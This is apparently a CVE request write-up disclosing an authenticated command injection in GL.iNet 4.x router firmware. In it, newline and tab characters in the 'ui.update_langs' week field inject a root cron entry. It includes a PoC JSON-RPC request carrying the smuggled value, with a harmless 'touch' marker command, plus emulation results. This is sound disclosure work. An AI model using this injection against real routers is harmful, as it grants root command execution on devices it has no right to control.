# CVE Request Material: GL.iNet 4.x ui.update_langs Authenticated Cron Command Injection

## Summary

GL.iNet 4.x firmware exposes an authenticated JSON-RPC method `ui.update_langs`. The method accepts language-update schedule fields and stores `args.week` into `gl_timer.langs.week`.

`/etc/init.d/gl_timer` later writes this value into the root crontab without removing newlines or tabs:

```sh
echo "$min $hour * * $week gl_timer_control_langs 1 $week $hour $min" >> /tmp/gl_crontabs/crontabs.d/langs
```

Because `ui.update_langs` has no method-specific validator, the default RPC validator permits newline and tab characters. An authenticated administrator can inject a second cron entry and execute arbitrary commands as root.

## Affected Local Firmware Set

Static evidence for the vulnerable entry point and sink is present in:

- GL.iNet GL-MT3000 firmware `4.8.1`
- GL.iNet GL-MT6000 firmware `4.9.0`
- GL.iNet GL-X3000 firmware `4.8.3`

`GL-AR300M16 4.3.27` contains the `gl_timer` cron sink, but the reviewed `ui` RPC module does not expose `update_langs`; this package does not claim AR300M16.

## Vulnerability Type

- CWE-78: Improper Neutralization of Special Elements used in an OS Command
- CWE-20: Improper Input Validation
- CWE-94 style impact: attacker-controlled scheduled code execution through generated root cron content

## Entry Point

The reviewed authenticated path is:

```text
/rpc -> /usr/share/gl-ngx/oui-rpc.lua -> /usr/lib/lua/oui/rpc.lua -> /usr/lib/oui-httpd/rpc/ui -> update_langs
```

This report does not claim unauthenticated exploitation.

## PoC Request Shape

```json
{
  "jsonrpc": "2.0",
  "method": "call",
  "params": [
    "<admin_sid>",
    "ui",
    "update_langs",
    {
      "enable": true,
      "hour": "0",
      "min": "0",
      "week": [
        "1\n0-59\t0-23\t1-31\t1-12\t0-6\ttouch\t/tmp/glinet_ui_timer_pwn\t#"
      ],
      "list": []
    }
  ],
  "id": 1
}
```

All characters in the injected `week` string are accepted by the fallback validator used when no method-specific rule exists.

## Dynamic Verification

Two QEMU-based harnesses are included.

The stronger Lua RPC harness loads the real `ui.lua` validator, the real `ui` RPC module, and the firmware `uci` Lua module. It confirms that the malicious `week` value:

1. passes the same default RPC string validator used when `ui.update_langs` has no method-specific rule;
2. reaches the real `ui.update_langs` implementation;
3. is persisted into `gl_timer.langs.week`;
4. causes `gl_timer` cron generation to create an injected cron line;
5. executes the injected command as cron would.

Observed result:

```text
VALIDATOR_RC=0
NGX_SPAWN=/etc/init.d/gl_timer restart
MARKER_CREATED=/tmp/glinet_ui_rpc_timer_pwn
```

Full output:

```text
evidence/verify_qemu_lua_rpc_update_langs_cron_cmdi_output.txt
evidence/verify_qemu_rootfs_gl_timer_cron_cmdi_output.txt
```

## Duplicate Risk

Public records reviewed did not identify a known CVE or public advisory for the specific `ui.update_langs` -> `gl_timer.langs.week` -> root crontab injection chain.

This is separate from public GL.iNet `plugins.install_package` command injection records, including CVE-2025-67089 and older package-name command-injection reports.

## Suggested Severity

CVSS v3.1, if scored as authenticated web-management access over the network:

```text
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H = 7.2 High
```

If the CNA treats the management interface as adjacent-network only, the attack vector may be adjusted to `AV:A`.
